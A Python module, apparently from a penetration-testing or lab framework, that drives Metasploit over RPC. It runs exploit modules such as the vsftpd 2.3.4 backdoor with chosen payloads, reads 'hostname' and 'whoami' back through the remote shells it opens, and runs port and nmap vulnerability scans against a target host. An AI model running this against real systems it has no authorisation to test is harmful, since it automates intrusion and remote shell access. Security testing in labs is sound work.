import re
import nmap
import time

from metasploit.connections import Metasploit
from metasploit.api import utils as global_utils
from . import utils


class ModuleExecution(object):
    """
    This is a class for module execution in metasploit on a container on amazon docker server.
    """
    def __init__(self, target_host, source_host, port):
        """
        Initializes the module execution constructor and implement a connection to the right container with the port.

        Args:
            target_host (str): the target host to "attack". can be either IP/DNS
            source_host (str): the source host that performs the "attack". can be either IP/DNS
            port (int): The port that the msfrpcd listens to.
        """
        self._target_host = target_host
        self._source_host = source_host
        self._metasploit_connection = Metasploit(server=source_host, port=port)

    @property
    def metasploit_connection(self):
        """
        Returns the metasploit connection object.
        """
        return self._metasploit_connection

    @property
    def target_host(self):
        return self._target_host

    def execute_module(self, module_name, module_type):
        """
        Executes the requested module of the metasploit.

        Args:
            module_name (str): module name.
            module_type (str): module type.

        Returns:
            MsfModule: a msfmodule object. e.g. ExploitModule, AuxiliaryModule, PayloadModule.
        """
        utils.check_if_module_is_supported(
            module_name=module_name,
            module_type=module_type,
            metasploit_connection=self.metasploit_connection
        )
        return self.metasploit_connection.modules.use(mtype=module_type, mname=module_name)


class ExploitExecution(ModuleExecution):

    def execute_exploit(self, exploit_name, options, payloads, module_type='exploit'):
        """
        Validates and executes the exploit provided by the client.

        Args:
            exploit_name (str): the exploit name, e.g.: 'unix/ftp/vsftpd_234_backdoor'
            options (dict): all the options to fill up for the exploit.
            payloads (list(str)): all the payloads to run with the exploit.
            module_type (str): the module type, defaults to 'exploit'

        Returns:
            list(dict): exploit details with all chosen payloads in case they were successful in any kind of way.
        """
        exploit = super().execute_module(module_name=exploit_name, module_type=module_type)
        required_options = exploit.missing_required
        utils.check_required_options_for_module(
            required_params=required_options, options=options, module_name=exploit_name
        )
        utils.check_if_payloads_are_supported(available_payloads=exploit.payloads, client_payloads=payloads)

        for option, option_value in options.items():
            exploit[option] = option_value

        return self._build_exploit_json(exploit=exploit, exploit_name=exploit_name, payloads=payloads)

    def _build_exploit_json(self, exploit, exploit_name, payloads):
        """
        Run the exploit with the payloads and build the json for the client.

        Args:
            exploit (ExploitModule): exploit module object.
            exploit_name (str): exploit name.
            payloads (list(str)): all the payloads requested by the client.

        Returns: list(dict): exploit details with all chosen payloads in case they were successful in any kind of way.

        Examples for what the function returns:

        [
            {
                "session":
                {
                    'type': 'shell', 'tunnel_local': '0.0.0.0:0', 'tunnel_peer': '172.18.0.3:6200',
                    'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor', 'via_payload': 'payload/cmd/unix/interact',
                    'desc': 'Command shell', 'info': '', 'workspace': 'default', 'session_host': '172.18.0.3',
                    'session_port': 21, 'target_host': '172.18.0.3', 'username': 'unknown', 'uuid': 'kwuol3sx',
                    'exploit_uuid': 'twu5wlxg', 'routes': '', 'arch': 'cmd'
                },
                "hostname": "the host name of the target host (executed using remote shell)",
                "whoami": "the user of the target host (usually root user), (executed using remote shell)",
            },
            {
                "job": # only job was created and not a session!!!!
                {
                    'jid': 32, 'name': 'Exploit: freebsd/samba/trans2open', 'start_time': 1607718442, 'datastore':
                    {
                        'WORKSPACE': None, 'VERBOSE': False, 'WfsDelay': 0, 'EnableContextEncoding': False,
                        'ContextInformationFile': None, 'DisablePayloadHandler': False, 'RHOSTS': '172.18.0.3',
                        'RPORT': 139, 'SSL': False, 'SSLVersion': 'Auto', 'SSLVerifyMode': 'PEER', 'SSLCipher': None,
                        'Proxies': None, 'CPORT': None, 'CHOST': None, 'ConnectTimeout': 10, 'TCP::max_send_size': 0,
                        'TCP::send_delay': 0, 'NTLM::UseNTLMv2': True, 'NTLM::UseNTLM2_session': True,
                        'NTLM::SendLM': True, 'NTLM::UseLMKey': False, 'NTLM::SendNTLM': True, 'NTLM::SendSPN': True,
                        'SMB::pipe_evasion': False, 'SMB::pipe_write_min_size': 1, 'SMB::pipe_write_max_size': 1024,
                        'SMB::pipe_read_min_size': 1, 'SMB::pipe_read_max_size': 1024, 'SMB::pad_data_level': 0,
                        'SMB::pad_file_level': 0, 'SMB::obscure_trans_pipe_level': 0, 'SMBDirect': True, 'SMBUser': '',
                        'SMBPass': '', 'SMBDomain': '.', 'SMBName': '*SMBSERVER', 'SMB::VerifySignature': False,
                        'SMB::ChunkSize': 500, 'SMB::Native_OS': 'Windows 2000 2195',
                        'SMB::Native_LM': 'Windows 2000 5.0', 'SMB::AlwaysEncrypt': True, 'BruteWait': None,
                        'BruteStep': None, 'TARGET': 0, 'PAYLOAD': 'bsd/x86/metsvc_bind_tcp', 'LPORT': 4444,
                        'PrependSetresuid': False, 'PrependSetreuid': False, 'PrependSetuid': False,
                        'PrependSetresgid': False, 'PrependSetregid': False, 'PrependSetgid': False,
                        'AppendExit': False, 'AutoLoadStdapi': True, 'AutoVerifySession': True,
                        'AutoVerifySessionTimeout': 30, 'InitialAutoRunScript': '', 'AutoRunScript': '',
                        'AutoSystemInfo': True, 'EnableUnicodeEncoding': False, 'HandlerSSLCert': None,
                        'SessionRetryTotal': 3600, 'SessionRetryWait': 10, 'SessionExpirationTimeout': 604800,
                        'SessionCommunicationTimeout': 300, 'PayloadProcessCommandLine': '', 'AutoUnhookProcess': False
                    }
                }
            },
        ]
        """
        json_exploit_list_with_each_payload = []

        _session = "session"
        _hostname = "hostname"
        _job = "job"
        _whoami = "whoami"
        _jobid = "job_id"
        _error = "error"

        for payload in payloads:
            exploit_job = exploit.execute(payload=payload)
            exploit_payload_json = {}

            time.sleep(7)

            for session_num, session_details in self.metasploit_connection.metasploit_client.sessions.list.items():

                print(session_num)
                print(session_details)

                if exploit_name in session_details['via_exploit'] and payload in session_details['via_payload']:

                    exploit_payload_json[_session] = session_details
                    shell = self.metasploit_connection.metasploit_client.sessions.session(sid=session_num)

                    for shell_cmd in [_hostname, _whoami]:
                        shell.write(data=shell_cmd)
                        exploit_payload_json[shell_cmd] = shell.read()

            if exploit_job[_jobid] in self.metasploit_connection.metasploit_client.jobs.list:
                job_details = self.metasploit_connection.metasploit_client.jobs.info(jobid=exploit_job[_jobid])
                if _error not in job_details:
                    exploit_payload_json[_job] = job_details

            if exploit_payload_json:
                exploit_payload_json["target"] = self.target_host
                json_exploit_list_with_each_payload.append(exploit_payload_json)
        return json_exploit_list_with_each_payload


class AuxiliaryExecution(ModuleExecution):

    @property
    def port_scanning(self):
        """
        Scan all the open ports on the target host.

        Returns: list(str): list with all the open ports on the target host.
            e.g.: [
            '172.18.0.3:3306', '172.18.0.3:3632', '172.18.0.3:5432',
            '172.18.0.3:5900', '172.18.0.3:6000',
            '172.18.0.3:6200', '172.18.0.3:6667', '172.18.0.3:6697',
            '172.18.0.3:8009', '172.18.0.3:8180', '172.18.0.3:8787'
        ]
        """
        console = self.metasploit_connection.host_console

        for cmd in ['use auxiliary/scanner/portscan/tcp', f'set RHOSTS {self.target_host}', 'run']:
            console_busy = True
            console.write(command=cmd)

            while console_busy:
                time.sleep(10)
                output = console.read()
                if not output['busy']:
                    console_busy = False
                print(output['data'])
                if cmd == 'run':
                    self.metasploit_connection.destory_console()
                    return re.findall(pattern=f"{self.target_host}:[0-9]+", string=output['data'])

    @property
    def db_nmap_vulnerabilites(self):

        console = self.metasploit_connection.host_console

        console_busy = True
        console.write(command=f'db_nmap -v --script vuln {self.target_host}')

        while console_busy:
            time.sleep(10)
            console_output = console.read()
            print(console_output['data'])
            if not console_output['busy']:
                self.metasploit_connection.destory_console()
                return console_output['data']
        return ""

    @property
    def local_nmap_show_vulnerabilites(self):

        nmap_obj = nmap.PortScanner()
        vulnerabilities_found = {}

        nmap_script_scan_res = nmap_obj.scan(hosts=self.target_host, arguments='-v --script vuln')

        if nmap_script_scan_res['nmap']['scaninfo']['error']:
            return {}

        for tcp_ports_result in nmap_script_scan_res['scan'][self.target_host]['tcp'].values():
            cur_vuln_script_result = tcp_ports_result['script']
            for vuln_name, vuln_details in cur_vuln_script_result.items():
                if 'ERROR' not in vuln_details:
                    vulnerabilities_found[vuln_name] = global_utils.remove_trailing_spaces(string=vuln_details)
        return vulnerabilities_found
